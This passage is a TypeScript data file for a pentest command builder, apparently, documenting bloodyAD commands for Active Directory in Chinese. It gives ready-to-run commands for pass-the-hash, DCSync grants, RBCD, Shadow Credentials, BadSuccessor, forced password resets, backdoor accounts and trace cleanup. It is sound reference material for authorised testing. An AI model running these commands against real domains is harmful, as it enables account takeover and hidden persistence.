import type { Tool } from '../../types';
import { buildBloodyADAuth, q, v } from '../../lib/auth';

/**
 * bloodyAD v2.5.4 数据文件
 * 参数定义来源: 本机安装的 bloodyAD v2.5.4 (pip 包 bloodyad) 各子命令 --help 输出
 * 以及官方文档: https://github.com/CravateRouge/bloodyAD
 * 命令结构: bloodyAD [全局参数] <add|get|set|remove|msldap> <子命令> [参数]
 */
export const bloodyadTools: Tool[] = [
  {
    id: 'bloodyad-overview',
    name: 'bloodyAD 全局参数与 ACL 简介',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: 'AD 权限提升瑞士军刀: 通过 LDAP/LDAPS/SAMR 直接操作 AD 对象与 ACL',
    guide: `【bloodyAD 全局参数】
命令结构: bloodyAD [全局参数] <add|get|set|remove|msldap> <子命令> [参数]
-d, --domain    NTLM 认证使用的域名
-u, --username  认证用户名
-p, --password  明文密码或 LMHASH:NTHASH (NTLM)；Kerberos 下可为密码/AES/RC4 密钥；证书认证时为证书密码；不指定则触发 Windows 集成认证
-k, --kerberos  启用 Kerberos 认证；可接关键字列表，如 -k kdc=192.168.100.1 kdcc=192.168.150.1 realmc=foreign.realm.corp ccache=/home/silver/Admin.ccache (keyfile 类型支持 ccache/kirbi/keytab，kdc 为该票据的 KDC，realmc/kdcc 用于跨域)
-f, --format    指定 -p 或 -k 密钥的格式: b64/hex/aes/rc4/default
-c, --certificate  Schannel 证书认证，或与 -k 配合做 PKINIT，格式 "key路径:cert路径" (留空则用 Windows 证书库)
-s, --secure    使用 LDAPS/GCS (TLS)；-ss 则去除所有加密/签名 (调试用)
-H, --host      DC 主机名或 IP (必填)
-i, --dc-ip     当 --host 无法解析时指定 DC IP
--dns           指定用于解析 AD 名称的 DNS IP (跨域场景有用)
-t, --timeout   连接超时秒数
--gc            连接全局编录 (GC)
-v, --verbose   输出详细程度: QUIET/INFO/DEBUG/TRACE
--json          以 JSON 格式输出结果

【ACL 简介】
AD 中每个对象都有安全描述符 (SD)，其 DACL 由若干 ACE 组成，每条 ACE 规定"谁 (trustee) 对什么对象拥有什么权限"。
常见危险权限:
- GenericAll: 对对象完全控制，等同于拥有该对象
- WriteDacl: 可修改对象 DACL，可给自己添加 GenericAll
- WriteOwner: 可修改对象所有者，成为所有者后即可改 DACL
- GenericWrite/WriteProperty: 可写对象属性，如改 SPN 做 targeted Kerberoasting、改 scriptPath 等
- ExtendedRight: User-Force-Change-Password (强制改密)、DS-Replication-Get-Changes(-All) (DCSync)
- Self: 对自身对象的特定写权限 (如 validated write)
基于属性的攻击面:
- msDS-AllowedToActOnBehalfOfOtherIdentity: 基于资源的约束委派 (RBCD)
- msDS-KeyCredentialLink: Shadow Credentials 攻击
bloodyAD 对应命令:
- 查权限: get object <target> --attr ntSecurityDescriptor --resolve-sd / get writable --detail
- 权限操作: add genericAll (完全控制) / set owner (夺所有权) / add dcsync (复制权限) / add rbcd (RBCD) / add shadowCredentials (影子凭据) / add uac (改 UAC 标志)`,
    commands: [
      {
        id: 'bloodyad-global-password',
        title: '全局用法: 明文密码认证',
        description: '最基础的认证形式，-H 指定 DC 主机 (必填)',
        build: (p) =>
          `bloodyAD -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -p ${q(v(p.password, 'PASSWORD'))} -H ${v(p.dcFQDN || p.dcIP, 'DC_HOST')} get writable --detail`,
        usage: `语法: bloodyAD -d <域名> -u <用户名> -p <密码> -H <DC主机> <类别> <子命令>
-d: 域名 (如 corp.local)
-u: 用户名
-p: 明文密码，也可直接给 LMHASH:NTHASH
-H: DC 主机名或 IP (必填)；主机名无法解析时加 -i <DC_IP>
示例执行 get writable --detail，枚举当前用户可写的对象及可写属性。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get writable --detail',
      },
      {
        id: 'bloodyad-global-hash',
        title: '全局用法: 哈希认证 (Pass-the-Hash)',
        description: '-p 直接接受 LMHASH:NTHASH 格式，无需明文密码',
        build: (p) =>
          `bloodyAD -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -p ${p.lmHash?.trim() || 'aad3b435b51404eeaad3b435b51404ee'}:${v(p.ntHash, 'NTHASH')} -H ${v(p.dcFQDN || p.dcIP, 'DC_HOST')} get object ${v('', 'TARGET')}`,
        usage: `语法: bloodyAD -d <域名> -u <用户名> -p <LMHASH:NTHASH> -H <DC主机> <类别> <子命令>
-p 接受 LMHASH:NTHASH 格式做 NTLM Pass-the-Hash
没有 LM 哈希时用空占位 aad3b435b51404eeaad3b435b51404ee
示例查询目标对象的所有 LDAP 属性。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -H dc01.corp.local get object Administrator',
      },
      {
        id: 'bloodyad-global-kerberos',
        title: '全局用法: Kerberos ccache 认证',
        description: '-k 接 kdc=/ccache= 关键字使用已有票据',
        build: (p) =>
          `bloodyAD -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -k kdc=${v(p.dcIP, 'KDC_IP')} ccache=${v(p.ccachePath, '/path/to/user.ccache')} -H ${v(p.dcFQDN, 'DC_HOST')} get membership ${v(p.username, 'USER')}`,
        usage: `语法: bloodyAD -d <域名> -u <用户名> -k kdc=<KDC_IP> ccache=<票据路径> -H <DC主机名> <类别> <子命令>
-k 后可接一个或多个空格分隔的关键字: kdc=<KDC地址> ccache=<票据文件> (也支持 kirbi/keytab)
跨域时加 kdcc=<目标域KDC> realmc=<目标域REALM>
Kerberos 按 SPN 匹配主机名，-H 必须用 DC 的 FQDN 而非 IP
也可用 -k -f aes -p <AES密钥> 以 AES key 请求 TGT。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -k kdc=10.0.0.1 ccache=/tmp/lowpriv.ccache -H dc01.corp.local get membership lowpriv',
      },
      {
        id: 'bloodyad-global-ldaps',
        title: '全局用法: LDAPS 加密连接',
        description: '-s 走 TLS 的 LDAPS/GCS，某些操作 (如改密码) 必须加密通道',
        build: (p) =>
          `bloodyAD -s -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -p ${q(v(p.password, 'PASSWORD'))} -H ${v(p.dcFQDN || p.dcIP, 'DC_HOST')} get trusts`,
        usage: `语法: bloodyAD -s -d <域名> -u <用户名> -p <密码> -H <DC主机> <类别> <子命令>
-s: 使用 LDAP over TLS (LDAPS, 636 端口)
修改 unicodePwd 等敏感属性的操作要求加密通道，必须加 -s
-ss 则相反，去除所有加密/签名，仅调试用。`,
        example:
          'bloodyAD -s -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get trusts',
      },
      {
        id: 'bloodyad-global-json',
        title: '全局用法: JSON 输出',
        description: '--json 以 JSON 格式输出，便于脚本化处理结果',
        build: (p) =>
          `bloodyAD -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -p ${q(v(p.password, 'PASSWORD'))} -H ${v(p.dcFQDN || p.dcIP, 'DC_HOST')} --json get search --filter "(adminCount=1)"`,
        usage: `语法: bloodyAD [认证参数] --json <类别> <子命令>
--json: 结果以 JSON 格式输出，方便 jq/脚本处理
配合 -v {QUIET,INFO,DEBUG,TRACE} 可调整日志详细程度
示例搜索 adminCount=1 的受保护账户。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local --json get search --filter "(adminCount=1)"',
      },
    ],
  },
  {
    id: 'bloodyad-add',
    name: 'bloodyAD add —— 添加类操作',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: '添加 AD 对象与权限: 用户/计算机/组成员/DCSync/RBCD/Shadow Credentials/UAC/DNS 记录等',
    commands: [
      {
        id: 'bloodyad-add-badsuccessor',
        title: 'add badSuccessor —— 创建 DMSA 对象 (BadSuccessor 攻击)',
        description: '创建 delegated MSA 并指定要继承权限的目标账户，利用 BadSuccessor (CVE-2025-53779)',
        build: (p) =>
          `${buildBloodyADAuth(p)} add badSuccessor ${v('', 'DMSA_NAME')} -t ${v('', 'CN=Administrator,CN=Users,DC=domain,DC=local')}`,
        usage: `语法: add badSuccessor <dmsa主机名> [-t <目标DN>] [--ou <OU>] [--prepatch]
dmsa: 新 DMSA 对象的主机名 (不需要结尾的 $)
-t: 要被冒用权限的目标对象 DN，可多次指定 (默认 Administrator)
--ou: 存放 DMSA 对象的 OU；不指定则选当前用户第一个可写子对象的 OU
--prepatch: DC 补丁低于 26100.4946 时使用，不写 msDS-Superseded* 属性
攻击场景: 在存在可写 OU 时创建 DMSA 继承高权限账户 (如 Administrator) 的凭据，实现域提权。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add badSuccessor evilDMSA -t "CN=Administrator,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-add-computer',
        title: 'add computer —— 创建计算机账户',
        description: '利用默认 MachineAccountQuota=10 创建机器账户，常用于 RBCD 攻击',
        build: (p) =>
          `${buildBloodyADAuth(p)} add computer ${v('', 'HOSTNAME')} ${v('', 'NEWPASS')}`,
        usage: `语法: add computer <hostname> <newpass> [--ou <OU>] [--lifetime <秒>]
hostname: 计算机名 (不带结尾 $)
newpass: 计算机账户密码
--ou: 计算机对象存放的 OU (默认默认容器)
--lifetime: 对象存活秒数，非 0 则创建为动态对象 (默认 0)
攻击场景: 默认域内任意用户可创建 10 个机器账户；创建后配合 add rbcd 对目标做 RBCD 委派攻击。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add computer EVILPC "EvilPass123!"',
      },
      {
        id: 'bloodyad-add-dcsync',
        title: 'add dcsync —— 授予 DCSync 权限',
        description: '给 trustee 添加域对象上的复制权限 (需对域对象有 WriteDacl 或所有权)',
        build: (p) => `${buildBloodyADAuth(p)} add dcsync ${v('', 'TRUSTEE')}`,
        usage: `语法: add dcsync <trustee>
trustee: 被授权者的 sAMAccountName/DN/SID
在域对象上添加 DS-Replication-Get-Changes 与 DS-Replication-Get-Changes-All 扩展权限
前提: 你对域对象拥有 WriteDacl 权限或为其所有者
攻击场景: 拿下域对象 DACL 后给自己加 DCSync 权限，随后用 impacket-secretsdump -just-dc 导出全域哈希。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add dcsync lowpriv',
      },
      {
        id: 'bloodyad-add-dnsrecord',
        title: 'add dnsRecord —— 添加 AD DNS 记录',
        description: '在 AD 集成 DNS 中添加记录，可用于配合 NTLM relay/欺骗攻击',
        build: (p) =>
          `${buildBloodyADAuth(p)} add dnsRecord ${v('', 'RECORD_NAME')} ${v(p.localIP, 'DATA')} --dnstype A`,
        usage: `语法: add dnsRecord <name> <data> [--dnstype {A,AAAA,CNAME,MX,PTR,SRV,TXT}] [--zone <区域>] [--ttl <秒>] [--preference <n>] [--port <n>] [--priority <n>] [--weight <n>] [--forest]
name: dnsNode 对象名 (主机名)
data: 记录数据，多数类型为目标主机名或 IP；TXT 类型可为文本
--dnstype: 记录类型 (默认 A)
--zone: DNS 区域 (默认当前域)
--ttl: 缓存秒数，想快速传播更新就设低 (默认 300)
--preference/--port/--priority/--weight: MX/SRV 记录相关参数
--forest: 在林级别而非域级别注册记录
攻击场景: 默认域用户可在 AD DNS 中添加记录，将不存在的主机名指向攻击者 IP，配合 mitm6/relay 投毒。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add dnsRecord fakeweb 10.0.0.50 --dnstype A',
      },
      {
        id: 'bloodyad-add-genericall',
        title: 'add genericAll —— 授予完全控制',
        description: '给 trustee 在目标及后代对象上加 GenericAll (需对目标有 WriteDacl 或所有权)',
        build: (p) =>
          `${buildBloodyADAuth(p)} add genericAll ${v('', 'TARGET')} ${v('', 'TRUSTEE')}`,
        usage: `语法: add genericAll <target> <trustee>
target: 目标对象的 sAMAccountName/DN/SID
trustee: 获得完全控制的对象 sAMAccountName/DN/SID
前提: 你是目标所有者或对其有 WriteDacl
攻击场景: 有 WriteDacl 的对象 (用户/组/计算机/GPO) 上给自己加 GenericAll，进而改密、加组成员、做 RBCD 或 Shadow Credentials。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add genericAll "CN=Domain Admins,CN=Users,DC=corp,DC=local" lowpriv',
      },
      {
        id: 'bloodyad-add-groupmember',
        title: 'add groupMember —— 添加组成员',
        description: '把用户/组/计算机加入目标组 (需对组有写成员权限)',
        build: (p) =>
          `${buildBloodyADAuth(p)} add groupMember ${v('', 'GROUP')} ${v('', 'MEMBER')}`,
        usage: `语法: add groupMember <group> <member>
group: 目标组的 sAMAccountName/DN/SID
member: 待加入成员 (用户/组/计算机) 的 sAMAccountName/DN/SID
前提: 对组对象有 WriteProperty member 或更高权限
攻击场景: 拿下高价值组 (如 Domain Admins) 的写权限后把自己加进去完成提权。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add groupMember "Domain Admins" lowpriv',
      },
      {
        id: 'bloodyad-add-rbcd',
        title: 'add rbcd —— 配置基于资源的约束委派',
        description: '在目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 上授权服务账户 (RBCD 攻击核心)',
        build: (p) =>
          `${buildBloodyADAuth(p)} add rbcd ${v('', 'TARGET')} ${v('', 'SERVICE_ACCOUNT')}`,
        usage: `语法: add rbcd <target> <service>
target: 目标计算机的 sAMAccountName/DN/SID
service: 被授权的服务账户 (通常是自建的机器账户) 的 sAMAccountName/DN/SID
前提: 对目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 有写权限，DC 为 Windows Server 2012+
攻击场景: 与 add computer 配合: 建机器账户 -> 对目标加 RBCD -> impacket-getST -spn cifs/target -impersonate Administrator 拿 S4U2Self+S4U2Proxy 票据。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add rbcd "SRV01$" "EVILPC$"',
      },
      {
        id: 'bloodyad-add-shadowcredentials',
        title: 'add shadowCredentials —— Shadow Credentials 攻击',
        description: '向目标的 msDS-KeyCredentialLink 写入密钥凭据并直接用 PKINIT 换回 TGT 与 NT 哈希',
        build: (p) =>
          `${buildBloodyADAuth(p)} add shadowCredentials ${v('', 'TARGET')}`,
        usage: `语法: add shadowCredentials <target> [--path <路径>] [--stealth]
target: 目标用户/计算机的 sAMAccountName/DN/SID
--path: 生成凭据的保存路径 (TGT ccache，PKINIT 失败时为 pfx)，默认当前目录
--stealth: 跳过 DC 版本/PKINIT/nthash unpac 检查
前提: 对目标有 GenericAll/GenericWrite/WriteProperty msDS-KeyCredentialLink 权限；DC 需 >= Win2016
攻击场景: 拿下账户写权限后无需改密即可获取其 TGT 和 NT 哈希，常用于接管计算机账户做 RBCD。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add shadowCredentials "SRV01$"',
      },
      {
        id: 'bloodyad-add-uac',
        title: 'add uac —— 添加 UAC 属性标志',
        description: '修改 userAccountControl 标志，如 DONT_REQ_PREAUTH (AS-REP roasting)',
        build: (p) =>
          `${buildBloodyADAuth(p)} add uac ${v('', 'TARGET')} -f ${v('', 'FLAG')}`,
        usage: `语法: add uac <target> [-f <FLAG> ...]
target: 目标用户/计算机的 sAMAccountName/DN/SID
-f: 要添加的属性标志名，可多次指定 (如 -f DONT_REQ_PREAUTH -f DONT_EXPIRE_PASSWORD)
攻击场景: 对目标有写权限时加 DONT_REQ_PREAUTH 使目标可被 AS-REP roasting；或加 TRUSTED_FOR_DELEGATION 配置非约束委派。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local add uac svc_backup -f DONT_REQ_PREAUTH',
      },
      {
        id: 'bloodyad-add-user',
        title: 'add user —— 创建域用户',
        description: '创建新域用户 (需要在目标容器上有创建子对象权限)',
        build: (p) =>
          `${buildBloodyADAuth(p)} add user ${v('', 'SAMACCOUNTNAME')} ${v('', 'NEWPASS')}`,
        usage: `语法: add user <sAMAccountName> <newpass> [--ou <OU>] [--lifetime <秒>]
sAMAccountName: 新用户名
newpass: 新用户密码
--ou: 新用户存放的 OU (默认默认容器)
--lifetime: 对象存活秒数，非 0 则创建为动态对象 (默认 0)
攻击场景: 有容器/OU 的 CreateChild user 权限时创建持久化后门账户。`,
        example:
          'bloodyAD -d corp.local -u operator -p Password123 -H dc01.corp.local add user backdoor "Backdoor123!"',
      },
    ],
  },
  {
    id: 'bloodyad-get',
    name: 'bloodyAD get —— 查询枚举类操作',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: '查询 AD 对象/属性/权限/DNS/信任关系，含 BloodHound CE 采集器',
    commands: [
      {
        id: 'bloodyad-get-bloodhound',
        title: 'get bloodhound —— BloodHound CE 数据采集',
        description: '采集 AD 数据生成 BloodHound CE 兼容 zip (开发中，仅基础节点)',
        build: (p) => `${buildBloodyADAuth(p)} get bloodhound --path ${v('', 'OUTPUT_DIR')}`,
        usage: `语法: get bloodhound [--transitive] [--path <路径>]
--transitive: 尝试跨信任关系采集以获得更完整结果 (建议从用户所在域的 DC 开始)
--path: 生成 zip 文件的保存路径 (默认当前目录)
注意: 官方提示该采集器仍在开发中，ADCS ESC 等复杂节点尚不支持。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get bloodhound --path /tmp/bh_out',
      },
      {
        id: 'bloodyad-get-children',
        title: 'get children —— 列出子对象',
        description: '列出目标对象下的子对象，可按 objectClass 过滤',
        build: (p) => `${buildBloodyADAuth(p)} get children --target ${v('', 'TARGET')}`,
        usage: `语法: get children [--target <目标>] [--otype <类型>] [--direct]
--target: 目标对象 sAMAccountName/DN/SID (默认整个域)
--otype: 特殊关键字 "useronly" 或 objectClass 过滤 (computer/group/trustedDomain/organizationalUnit/container/groupPolicyContainer/msDS-GroupManagedServiceAccount 等，默认 *)
--direct: 只取直接子对象
用途: 枚举 OU/容器结构，快速盘点域内对象。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get children --otype useronly',
      },
      {
        id: 'bloodyad-get-dnsdump',
        title: 'get dnsDump —— 导出 AD DNS 记录',
        description: '导出当前用户可读/可列的 AD 集成 DNS 记录',
        build: (p) => `${buildBloodyADAuth(p)} get dnsDump`,
        usage: `语法: get dnsDump [--zone <区域>] [--no-detail] [--transitive]
--zone: 只打印指定区域的记录
--no-detail: 不包含 _ldap/_kerberos/@ 等系统记录
--transitive: 尝试跨信任关系获取 DNS 记录 (建议从用户所在域的 DC 开始)
用途: 内网信息收集，通过 DNS 记录定位服务器与网段。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get dnsDump --no-detail',
      },
      {
        id: 'bloodyad-get-membership',
        title: 'get membership —— 查询组成员关系',
        description: '返回目标所属所有组的 SID 与 sAMAccountName',
        build: (p) => `${buildBloodyADAuth(p)} get membership ${v('', 'TARGET')}`,
        usage: `语法: get membership <target> [--no-recurse]
target: 目标对象的 sAMAccountName/DN/SID
--no-recurse: 不递归，只列出直接所属的组
用途: 枚举账户/计算机的嵌套组成员关系，评估权限。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get membership lowpriv',
      },
      {
        id: 'bloodyad-get-object',
        title: 'get object —— 读取对象属性',
        description: '读取目标对象 LDAP 属性，--resolve-sd 可解析安全描述符权限',
        build: (p) =>
          `${buildBloodyADAuth(p)} get object ${v('', 'TARGET')} --attr ntSecurityDescriptor --resolve-sd`,
        usage: `语法: get object <target> [--attr <属性列表>] [--resolve-sd] [--raw] [--transitive]
target: 目标 sAMAccountName/DN/SID；空字符串 "" 打印 rootDSE
--attr: 逗号分隔的属性列表，默认全部 (*)
--resolve-sd: 解析安全描述符关联的权限 (详见官方 wiki/Access-Control)
--raw: 原样返回服务器数据，二进制以 base64 输出
--transitive: 与 --resolve-sd 配合，跨信任解析外部 SID
攻击场景: --attr ntSecurityDescriptor --resolve-sd 查看对象 DACL，确认自己拥有的 ACE。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get object "CN=Domain Admins,CN=Users,DC=corp,DC=local" --attr ntSecurityDescriptor --resolve-sd',
      },
      {
        id: 'bloodyad-get-search',
        title: 'get search —— 自定义 LDAP 搜索',
        description: '按 LDAP filter 搜索目录，支持扩展控制 (如显示已删除对象)',
        build: (p) =>
          `${buildBloodyADAuth(p)} get search --filter ${v('', '(LDAP_FILTER)')} --attr ${v('', 'ATTRS')}`,
        usage: `语法: get search [--base <DN>] [--filter <过滤器>] [--attr <属性>] [--resolve-sd] [--raw] [--transitive] [-c <控制OID> ...]
--base: 搜索起点 DN (默认域根)
--filter: LDAP 过滤器 (微软语法)，默认 (objectClass=*)
--attr: 逗号分隔的属性列表 (默认 *)
--resolve-sd: 解析安全描述符权限
--raw: 原样输出，二进制 base64
--transitive: 与 --resolve-sd 配合跨信任解析外部 SID
-c: 扩展搜索控制 OID，如 -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 显示 tombstone/已删除对象
用途: 通用 LDAP 查询入口，如 --filter "(adminCount=1)" 找特权账户。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get search --filter "(&(objectClass=user)(adminCount=1))" --attr sAMAccountName,memberOf',
      },
      {
        id: 'bloodyad-get-trusts',
        title: 'get trusts —— 显示域信任关系树',
        description: '以 ASCII 树展示信任关系: A->B 表示 A 可向 B 认证，A-<>B 双向',
        build: (p) => `${buildBloodyADAuth(p)} get trusts --transitive`,
        usage: `语法: get trusts [--transitive]
以当前 DC 所在域为树根打印信任关系 ASCII 树
输出含义: A->B 表示 A 可向 B 认证；A-<B 表示 B 可向 A 认证；A-<>B 双向信任
--transitive: 尝试获取传递信任 (建议从用户所在域的 DC 开始)
用途: 多域/林环境下梳理信任路径，规划横向移动。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get trusts --transitive',
      },
      {
        id: 'bloodyad-get-writable',
        title: 'get writable —— 枚举可写对象 (ACL 攻击面侦察)',
        description: '列出当前用户可写的对象，--detail 显示可写属性/可建子对象类型',
        build: (p) => `${buildBloodyADAuth(p)} get writable --detail`,
        usage: `语法: get writable [--otype <类型>] [--right {ALL,WRITE,CHILD}] [--detail] [--partition {DOMAIN,CONFIGURATION,SCHEMA,DNS,ALL}] [--transitive] [--exclude-del] [--bh]
--otype: 特殊关键字 "useronly, ou, gpo" 或 objectClass (computer/group/server 等，默认 *)
--right: 搜索的权限类型 ALL/WRITE/CHILD (默认 ALL)
--detail: 显示对每个对象可写的属性/可创建的子对象类型
--partition: 要探索的目录分区 (默认 ALL)
--transitive: 跨信任枚举 (建议从用户所在域的 DC 开始)
--exclude-del: 排除已删除对象
--bh: 将可写对象生成 BloodHound 兼容 zip
攻击场景: ACL 攻击面侦察第一命令，找出可滥用写权限后接 add genericAll/set owner/add rbcd 等。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local get writable --otype useronly --detail',
      },
    ],
  },
  {
    id: 'bloodyad-set',
    name: 'bloodyAD set —— 修改类操作',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: '修改对象属性/所有者/密码，恢复已删除对象',
    commands: [
      {
        id: 'bloodyad-set-object',
        title: 'set object —— 增/改/删对象属性',
        description: '通用属性修改: 改 SPN 做 targeted Kerberoasting、改 scriptPath 等',
        build: (p) =>
          `${buildBloodyADAuth(p)} set object ${v('', 'TARGET')} ${v('', 'ATTRIBUTE')} -v ${v('', 'VALUE')}`,
        usage: `语法: set object <target> <attribute> [-v <值> ...] [--raw] [--b64]
target: 目标 sAMAccountName/DN/SID
attribute: 属性名
-v: 属性不存在则添加、存在则替换、不给值则删除；多值属性可多次指定 (如 -v HOST/pc1 -v HOST/pc1.corp.local)
--raw: 不做任何编码原样发送值
--b64: -v 的值按 base64 解码 (仅配合 --raw)
攻击场景: 对目标有 GenericWrite/WriteProperty 时改 servicePrincipalName 做 targeted Kerberoasting，或改 scriptPath/msTSInitialProgram 实现登录执行。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local set object victim_svc servicePrincipalName -v "HTTP/fake.corp.local"',
      },
      {
        id: 'bloodyad-set-owner',
        title: 'set owner —— 夺取对象所有权',
        description: '修改对象所有者 (需 WriteOwner 权限)，拿下后可改 DACL',
        build: (p) =>
          `${buildBloodyADAuth(p)} set owner ${v('', 'TARGET')} ${v('', 'NEW_OWNER')}`,
        usage: `语法: set owner <target> <owner>
target: 目标对象的 sAMAccountName/DN/SID
owner: 新所有者的 sAMAccountName/DN/SID
前提: 对目标有 WriteOwner 权限
攻击场景: 经典 ACL 利用链: WriteOwner -> set owner 夺所有权 -> add genericAll 给自己完全控制 -> 改密/加组/RBCD。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local set owner "CN=Domain Admins,CN=Users,DC=corp,DC=local" lowpriv',
      },
      {
        id: 'bloodyad-set-password',
        title: 'set password —— 修改用户/计算机密码',
        description: '有 User-Force-Change-Password/GenericAll 时强制重置目标密码',
        build: (p) =>
          `${buildBloodyADAuth(p)} set password ${v('', 'TARGET')} ${v('', 'NEWPASS')}`,
        usage: `语法: set password <target> <newpass> [--oldpass <旧密码>] [--stealth]
target: 目标用户/计算机的 sAMAccountName/DN/SID
newpass: 新密码
--oldpass: 目标旧密码；没有 "change password" 权限 (只有普通改密) 时必填
--stealth: 改密被拒时跳过密码策略检查
攻击场景: 对目标账户有 User-Force-Change-Password 扩展权限或 GenericAll 时直接重置密码完成账户接管。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local set password victim "Hacked123!"',
      },
      {
        id: 'bloodyad-set-restore',
        title: 'set restore —— 恢复已删除对象',
        description: '从 AD 回收站恢复被删除的对象',
        build: (p) => `${buildBloodyADAuth(p)} set restore ${v('', 'TARGET')}`,
        usage: `语法: set restore <target> [--newName <新名>] [--newParent <新父级DN>]
target: 目标的 DN/sAMAccountName (GPO 用 name) 或 SID (有重名时避免用 sAMAccountName)
--newName: 恢复后的新名称 (同时更新 sAMAccountName/UPN/SPN 等)，不给则用最后已知 RDN
--newParent: 恢复后的新父对象，不给则用最后已知父级
用途: 恢复误删/被删的账户、GPO 等对象，也可用于恢复被防御方删除的持久化账户。`,
        example:
          'bloodyAD -d corp.local -u admin -p Password123 -H dc01.corp.local set restore "CN=victim\\\\0ADEL:12345678-1234-1234-1234-123456789abc,CN=Deleted Objects,DC=corp,DC=local"',
      },
    ],
  },
  {
    id: 'bloodyad-remove',
    name: 'bloodyAD remove —— 删除类操作',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: '移除权限/成员/对象/DNS 记录/RBCD/Shadow Credentials/UAC 标志 (常用于清理痕迹)',
    commands: [
      {
        id: 'bloodyad-remove-dcsync',
        title: 'remove dcsync —— 移除 DCSync 权限',
        description: '移除 trustee 在域对象上的 DCSync 复制权限',
        build: (p) => `${buildBloodyADAuth(p)} remove dcsync ${v('', 'TRUSTEE')}`,
        usage: `语法: remove dcsync <trustee>
trustee: 要移除权限者的 sAMAccountName/DN/SID
移除 add dcsync 添加的 DS-Replication-Get-Changes(-All) ACE
用途: DCSync 攻击完成后清理痕迹。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove dcsync lowpriv',
      },
      {
        id: 'bloodyad-remove-dnsrecord',
        title: 'remove dnsRecord —— 删除 DNS 记录',
        description: '删除 AD 集成 DNS 中的记录',
        build: (p) =>
          `${buildBloodyADAuth(p)} remove dnsRecord ${v('', 'RECORD_NAME')} ${v('', 'DATA')} --dnstype A`,
        usage: `语法: remove dnsRecord <name> <data> [--dnstype {A,AAAA,CNAME,MX,PTR,SRV,TXT}] [--zone <区域>] [--ttl <秒>] [--preference <n>] [--port <n>] [--priority <n>] [--weight <n>] [--forest]
name: 包含记录的 dnsNode 对象名 (主机名)
data: 记录数据
--dnstype: 记录类型 (默认 A)
--zone: DNS 区域 (默认当前域)
--ttl/--preference/--port/--priority/--weight: 匹配 MX/SRV 记录用的参数
--forest: 在林级别而非域级别查找记录
用途: 清理攻击过程中添加的恶意 DNS 记录。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove dnsRecord fakeweb 10.0.0.50 --dnstype A',
      },
      {
        id: 'bloodyad-remove-genericall',
        title: 'remove genericAll —— 移除完全控制',
        description: '移除 trustee 在目标上的 GenericAll ACE',
        build: (p) =>
          `${buildBloodyADAuth(p)} remove genericAll ${v('', 'TARGET')} ${v('', 'TRUSTEE')}`,
        usage: `语法: remove genericAll <target> <trustee>
target: 目标对象的 sAMAccountName/DN/SID
trustee: 要移除完全控制的对象 sAMAccountName/DN/SID
用途: 移除 add genericAll 添加的 ACE，清理痕迹。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove genericAll "CN=Domain Admins,CN=Users,DC=corp,DC=local" lowpriv',
      },
      {
        id: 'bloodyad-remove-groupmember',
        title: 'remove groupMember —— 移除组成员',
        description: '从组中移除用户/组/计算机',
        build: (p) =>
          `${buildBloodyADAuth(p)} remove groupMember ${v('', 'GROUP')} ${v('', 'MEMBER')}`,
        usage: `语法: remove groupMember <group> <member>
group: 目标组的 sAMAccountName/DN/SID
member: 要移除的成员 (用户/组/计算机) 的 sAMAccountName/DN/SID
用途: 提权完成后把自己从高价值组中移除以清理痕迹。`,
        example:
